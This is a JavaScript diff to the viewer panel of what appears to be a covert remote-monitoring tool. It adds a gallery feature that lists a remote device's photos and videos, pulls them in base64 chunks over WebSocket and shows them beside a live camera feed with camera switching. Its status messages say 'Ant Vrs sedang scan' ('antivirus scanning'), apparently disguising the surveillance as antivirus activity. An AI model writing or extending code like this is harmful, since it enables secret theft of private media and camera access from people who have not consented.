@@ -12,6 +12,11 @@ const state = {
   authChecked: false,
   activeFeedPending: false,
   allowPublicSignup: true,
+  galleryItems: [],
+  galleryLoading: false,
+  galleryTransfers: new Map(),
+  activeGalleryRequestId: null,
+  activeGalleryObjectUrl: null,
   rtcConfig: {
     iceServers: [
       { urls: "stun:stun.l.google.com:19302" },
@@ -43,6 +48,17 @@ const elements = {
   switchCameraButton: document.getElementById("switchCameraButton"),
   remoteVideo: document.getElementById("remoteVideo"),
   videoPlaceholder: document.getElementById("videoPlaceholder"),
+  refreshGalleryButton: document.getElementById("refreshGalleryButton"),
+  galleryGrid: document.getElementById("galleryGrid"),
+  galleryEmpty: document.getElementById("galleryEmpty"),
+  galleryHint: document.getElementById("galleryHint"),
+  galleryModal: document.getElementById("galleryModal"),
+  galleryCloseButton: document.getElementById("galleryCloseButton"),
+  galleryModalTitle: document.getElementById("galleryModalTitle"),
+  galleryModalMeta: document.getElementById("galleryModalMeta"),
+  galleryPreviewLoading: document.getElementById("galleryPreviewLoading"),
+  galleryPreviewImage: document.getElementById("galleryPreviewImage"),
+  galleryPreviewVideo: document.getElementById("galleryPreviewVideo"),
   toast: document.getElementById("toast"),
   statusDot: document.getElementById("statusDot"),
   statusText: document.getElementById("statusText"),
@@ -59,6 +75,13 @@ function bootstrap() {
   elements.resetTokenButton.addEventListener("click", resetToken);
   elements.reloadButton.addEventListener("click", reconnectViewer);
   elements.switchCameraButton.addEventListener("click", sendSwitchCamera);
+  elements.refreshGalleryButton.addEventListener("click", () => requestGalleryList(true));
+  elements.galleryCloseButton.addEventListener("click", closeGalleryModal);
+  elements.galleryModal.addEventListener("click", (event) => {
+    if (event.target === elements.galleryModal) {
+      closeGalleryModal();
+    }
+  });
   elements.remoteVideo.addEventListener("loadeddata", () => {
     elements.videoPlaceholder.classList.add("hidden");
   });
@@ -165,6 +188,7 @@ async function handleLogout() {
   state.token = "";
   state.selectedDeviceId = null;
   state.devices = [];
+  resetGalleryState();
   renderDeviceList();
   showLoginPanel();
 }
@@ -174,6 +198,7 @@ function showLoginPanel() {
   elements.viewerPanel.classList.add("hidden");
   elements.logoutButton.classList.add("hidden");
   updateRegisterAvailability();
+  renderGalleryState();
   updateStatus("error", "Ant Vrs sedang scan.", "Masuk dulu agar ant vrs sedang bekerja bisa mengakses monitor.");
 }
 
@@ -182,6 +207,7 @@ function showViewerPanel() {
   elements.viewerPanel.classList.remove("hidden");
   elements.logoutButton.classList.remove("hidden");
   syncTokenView();
+  renderGalleryState();
   updateStatus("busy", "Ant Vrs sedang bekerja.", "Ant vrs sedang scan dan menghubungkan monitor ke server.");
 }
 
@@ -237,6 +263,7 @@ async function resetToken() {
     state.selectedDeviceId = null;
     state.devices = [];
     state.activeFeedPending = false;
+    resetGalleryState();
     syncTokenView();
     renderDeviceList();
     reconnectViewer();
@@ -410,6 +437,7 @@ async function handleSocketMessage(message) {
     case "registered":
       if (state.selectedDeviceId) {
         requestSelectedDeviceFeed();
+        requestGalleryList();
       } else if (!state.activeFeedPending) {
         updateStatus("busy", "Ant Vrs sedang scan.", "Pilih salah satu perangkat yang tersedia.");
       }
@@ -420,8 +448,10 @@ async function handleSocketMessage(message) {
       if (state.selectedDeviceId && !state.devices.some((device) => device.device_id === state.selectedDeviceId)) {
         state.selectedDeviceId = null;
         state.activeFeedPending = false;
+        resetGalleryState();
       } else if (state.selectedDeviceId && !state.activeFeedPending) {
         requestSelectedDeviceFeed();
+        requestGalleryList();
       }
       renderDeviceList();
       break;
@@ -429,7 +459,25 @@ async function handleSocketMessage(message) {
       state.selectedDeviceId = message.device_id || state.selectedDeviceId;
       state.activeFeedPending = true;
       updateLiveSelection();
+      requestGalleryList();
       updateStatus("busy", "Ant Vrs sedang bekerja.", "Ant vrs sedang scan dan menunggu video.");
+      break;
+    case "gallery-list":
+      if (message.device_id && state.selectedDeviceId && message.device_id !== state.selectedDeviceId) {
+        break;
+      }
+      state.galleryItems = Array.isArray(message.gallery_items) ? message.gallery_items : [];
+      state.galleryLoading = false;
+      renderGalleryState();
+      break;
+    case "gallery-item-meta":
+      handleGalleryItemMeta(message);
+      break;
+    case "gallery-item-chunk":
+      handleGalleryItemChunk(message);
+      break;
+    case "gallery-item-complete":
+      handleGalleryItemComplete(message);
       break;
     case "offer":
       await handleOffer(message.sdp);
@@ -444,6 +492,7 @@ async function handleSocketMessage(message) {
         state.selectedDeviceId = null;
       }
       state.activeFeedPending = false;
+      resetGalleryState();
       updateLiveSelection();
       updateStatus("error", "Ant Vrs sedang scan.", "Pilih ulang perangkat lain saat sudah tersedia.");
       break;
@@ -515,6 +564,10 @@ function updateLiveSelection() {
     ? `Ant vrs sedang bekerja untuk ${selectedDevice.device_label} dan video akan tampil di sini.`
     : "Pilih perangkat dari daftar dan ant vrs sedang bekerja akan menampilkan video.";
   elements.switchCameraButton.disabled = !selectedDevice;
+  elements.refreshGalleryButton.disabled = !selectedDevice;
+  elements.galleryHint.textContent = selectedDevice
+    ? `Ant vrs sedang scan media terbaru dari ${selectedDevice.device_label}.`
+    : "Pilih perangkat lalu ant vrs sedang scan isi galeri terbaru.";
 }
 
 function selectDevice(deviceId) {
@@ -529,6 +582,7 @@ function selectDevice(deviceId) {
 
   state.selectedDeviceId = deviceId;
   state.activeFeedPending = true;
+  resetGalleryState();
   destroyPeerConnection();
   ensurePeerConnection();
   renderDeviceList();
@@ -537,6 +591,7 @@ function selectDevice(deviceId) {
     token: state.token,
     target_device_id: deviceId,
   });
+  requestGalleryList(true);
   updateStatus("busy", "Ant Vrs sedang bekerja.", "Ant vrs sedang scan dan memilih perangkat.");
 }
 
@@ -558,7 +613,211 @@ function requestSelectedDeviceFeed() {
     token: state.token,
     target_device_id: state.selectedDeviceId,
   });
+  requestGalleryList();
   updateStatus("busy", "Ant Vrs sedang bekerja.", "Ant vrs sedang scan dan membangun ulang live feed.");
+}
+
+function requestGalleryList(force = false) {
+  if (!state.selectedDeviceId) {
+    renderGalleryState();
+    return;
+  }
+
+  if (!state.socket || state.socket.readyState !== WebSocket.OPEN) {
+    return;
+  }
+
+  if (state.galleryLoading && !force) {
+    return;
+  }
+
+  state.galleryLoading = true;
+  if (force) {
+    state.galleryItems = [];
+  }
+  renderGalleryState();
+  sendMessage({
+    type: "gallery-list-request",
+    token: state.token,
+  });
+}
+
+function renderGalleryState() {
+  elements.galleryGrid.innerHTML = "";
+  const hasSelection = Boolean(state.selectedDeviceId);
+  const hasItems = state.galleryItems.length > 0;
+  elements.galleryEmpty.classList.toggle("hidden", hasSelection && (state.galleryLoading || hasItems));
+
+  if (!hasSelection) {
+    elements.galleryEmpty.textContent = "Pilih perangkat agar ant vrs sedang scan media terbaru.";
+    return;
+  }
+
+  if (state.galleryLoading) {
+    elements.galleryEmpty.textContent = "Ant Vrs sedang scan isi media dari perangkat.";
+    return;
+  }
+
+  if (!hasItems) {
+    elements.galleryEmpty.textContent = "Belum ada media yang tampil dari perangkat ini.";
+    return;
+  }
+
+  for (const item of state.galleryItems) {
+    const button = document.createElement("button");
+    button.type = "button";
+    button.className = "device-button gallery-card";
+    const thumbnailSource = item.thumbnail_data_url || "data:image/gif;base64,R0lGODlhAQABAAAAACw=";
+    button.innerHTML = `
+      <span class="gallery-card-badge">${item.media_type === "video" ? "Video" : "Foto"}</span>
+      <img class="gallery-card-thumb" src="${escapeHtml(thumbnailSource)}" alt="${escapeHtml(item.title || "Media perangkat")}" />
+      <div class="gallery-card-body">
+        <strong class="gallery-card-title">${escapeHtml(item.title || "Media perangkat")}</strong>
+        <span class="gallery-card-meta">${escapeHtml(formatGalleryMeta(item))}</span>
+      </div>
+    `;
+    button.addEventListener("click", () => requestGalleryItem(item));
+    elements.galleryGrid.appendChild(button);
+  }
+}
+
+function requestGalleryItem(item) {
+  if (!state.socket || state.socket.readyState !== WebSocket.OPEN) {
+    showToast("Ant Vrs sedang scan dan koneksi viewer belum siap.");
+    return;
+  }
+
+  closeGalleryModal({ preserveItems: true });
+  const requestId = buildRequestId();
+  state.activeGalleryRequestId = requestId;
+  state.galleryTransfers.set(requestId, {
+    item,
+    mimeType: item.mime_type || (item.media_type === "video" ? "video/mp4" : "image/jpeg"),
+    chunks: [],
+    chunkCount: 0,
+  });
+  openGalleryModal(item.title || "Media perangkat", formatGalleryMeta(item), true);
+  sendMessage({
+    type: "gallery-item-request",
+    token: state.token,
+    request_id: requestId,
+    media_id: item.media_id,
+  });
+}
+
+function handleGalleryItemMeta(message) {
+  const requestId = message.request_id;
+  const item = message.gallery_item;
+  const chunkCount = Number(message.chunk_count || 0);
+  if (!requestId || !item) {
+    return;
+  }
+
+  state.galleryTransfers.set(requestId, {
+    item,
+    mimeType: item.mime_type || (item.media_type === "video" ? "video/mp4" : "image/jpeg"),
+    chunks: new Array(Math.max(chunkCount, 0)),
+    chunkCount,
+  });
+
+  if (state.activeGalleryRequestId === requestId) {
+    openGalleryModal(item.title || "Media perangkat", formatGalleryMeta(item), true);
+  }
+}
+
+function handleGalleryItemChunk(message) {
+  const requestId = message.request_id;
+  const chunkIndex = Number(message.chunk_index);
+  const payloadBase64 = message.payload_base64;
+  if (!requestId || Number.isNaN(chunkIndex) || !payloadBase64) {
+    return;
+  }
+
+  const transfer = state.galleryTransfers.get(requestId);
+  if (!transfer) {
+    return;
+  }
+
+  transfer.chunks[chunkIndex] = base64ToUint8Array(payloadBase64);
+}
+
+function handleGalleryItemComplete(message) {
+  const requestId = message.request_id;
+  if (!requestId) {
+    return;
+  }
+
+  const transfer = state.galleryTransfers.get(requestId);
+  if (!transfer) {
+    return;
+  }
+
+  const blob = new Blob(transfer.chunks.filter(Boolean), { type: transfer.mimeType });
+  const objectUrl = URL.createObjectURL(blob);
+  if (state.activeGalleryObjectUrl) {
+    URL.revokeObjectURL(state.activeGalleryObjectUrl);
+  }
+  state.activeGalleryObjectUrl = objectUrl;
+  if (state.activeGalleryRequestId === requestId) {
+    renderGalleryPreview(transfer.item, objectUrl);
+    state.activeGalleryRequestId = null;
+  }
+  state.galleryTransfers.delete(requestId);
+}
+
+function openGalleryModal(title, meta, loading) {
+  elements.galleryModal.classList.remove("hidden");
+  elements.galleryModalTitle.textContent = title;
+  elements.galleryModalMeta.textContent = meta;
+  elements.galleryPreviewLoading.classList.toggle("hidden", !loading);
+  elements.galleryPreviewImage.classList.add("hidden");
+  elements.galleryPreviewVideo.classList.add("hidden");
+  elements.galleryPreviewImage.removeAttribute("src");
+  elements.galleryPreviewVideo.pause();
+  elements.galleryPreviewVideo.removeAttribute("src");
+  elements.galleryPreviewVideo.load();
+}
+
+function closeGalleryModal(options = {}) {
+  const { preserveItems = false } = options;
+  elements.galleryModal.classList.add("hidden");
+  elements.galleryPreviewLoading.classList.remove("hidden");
+  elements.galleryPreviewImage.classList.add("hidden");
+  elements.galleryPreviewVideo.classList.add("hidden");
+  elements.galleryPreviewImage.removeAttribute("src");
+  elements.galleryPreviewVideo.pause();
+  elements.galleryPreviewVideo.removeAttribute("src");
+  elements.galleryPreviewVideo.load();
+
+  if (state.activeGalleryObjectUrl) {
+    URL.revokeObjectURL(state.activeGalleryObjectUrl);
+    state.activeGalleryObjectUrl = null;
+  }
+
+  if (!preserveItems) {
+    state.activeGalleryRequestId = null;
+  }
+}
+
+function renderGalleryPreview(item, objectUrl) {
+  if (!item) {
+    return;
+  }
+
+  elements.galleryPreviewLoading.classList.add("hidden");
+  elements.galleryModalTitle.textContent = item.title || "Media perangkat";
+  elements.galleryModalMeta.textContent = formatGalleryMeta(item);
+
+  if (item.media_type === "video") {
+    elements.galleryPreviewVideo.src = objectUrl;
+    elements.galleryPreviewVideo.classList.remove("hidden");
+    elements.galleryPreviewImage.classList.add("hidden");
+    elements.galleryPreviewVideo.load();
+  } else {
+    elements.galleryPreviewImage.src = objectUrl;
+    elements.galleryPreviewImage.classList.remove("hidden");
+    elements.galleryPreviewVideo.classList.add("hidden");
+  }
 }
 
 function sendSwitchCamera() {
@@ -641,6 +900,15 @@ function handleBrowserOffline() {
   updateStatus("error", "Ant Vrs sedang scan.", "Tunggu koneksi internet kembali lalu ant vrs sedang bekerja lagi.");
 }
 
+function resetGalleryState() {
+  closeGalleryModal({ preserveItems: true });
+  state.galleryItems = [];
+  state.galleryLoading = false;
+  state.galleryTransfers.clear();
+  state.activeGalleryRequestId = null;
+  renderGalleryState();
+}
+
 function updateStatus(kind, title, subtitle) {
   elements.statusDot.className = `status-dot ${kind}`;
   elements.statusText.textContent = title;
@@ -654,6 +922,63 @@ function showToast(message) {
   showToast.timeoutId = window.setTimeout(() => {
     elements.toast.classList.add("hidden");
   }, 3200);
+}
+
+function formatGalleryMeta(item) {
+  const parts = [];
+  if (item.media_type === "video") {
+    parts.push("Video");
+  } else {
+    parts.push("Foto");
+  }
+  if (item.duration_ms) {
+    parts.push(formatDuration(item.duration_ms));
+  }
+  if (item.size_bytes) {
+    parts.push(formatBytes(item.size_bytes));
+  }
+  if (item.bucket_name) {
+    parts.push(item.bucket_name);
+  }
+  return parts.join(" • ");
+}
+
+function formatBytes(value) {
+  const size = Number(value || 0);
+  if (!size) {
+    return "0 B";
+  }
+  const units = ["B", "KB", "MB", "GB"];
+  const exponent = Math.min(Math.floor(Math.log(size) / Math.log(1024)), units.length - 1);
+  const normalized = size / 1024 ** exponent;
+  return `${normalized.toFixed(normalized >= 10 || exponent === 0 ? 0 : 1)} ${units[exponent]}`;
+}
+
+function formatDuration(value) {
+  const totalSeconds = Math.max(0, Math.floor(Number(value || 0) / 1000));
+  const hours = Math.floor(totalSeconds / 3600);
+  const minutes = Math.floor((totalSeconds % 3600) / 60);
+  const seconds = totalSeconds % 60;
+  if (hours > 0) {
+    return `${hours}:${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+  }
+  return `${minutes}:${String(seconds).padStart(2, "0")}`;
+}
+
+function buildRequestId() {
+  if (window.crypto?.randomUUID) {
+    return window.crypto.randomUUID();
+  }
+  return `req-${Date.now()}-${Math.random().toString(16).slice(2)}`;
+}
+
+function base64ToUint8Array(base64) {
+  const binaryString = window.atob(base64);
+  const bytes = new Uint8Array(binaryString.length);
+  for (let index = 0; index < binaryString.length; index += 1) {
+    bytes[index] = binaryString.charCodeAt(index);
+  }
+  return bytes;
 }
 
 function escapeHtml(value) {
